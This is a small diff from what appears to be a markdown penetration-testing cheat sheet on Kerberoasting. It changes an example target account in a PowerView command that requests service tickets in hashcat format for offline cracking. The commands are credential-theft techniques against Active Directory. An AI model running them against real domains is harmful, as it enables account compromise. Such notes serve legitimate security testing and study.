@@ -124,7 +124,7 @@ Get-DomainUser * -spn | select samaccountname
 ```
 ##### Target a specific user 
 ```powershell
-Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat
 ```
 ##### Export All tickets to a CSV File 
 ```powershell
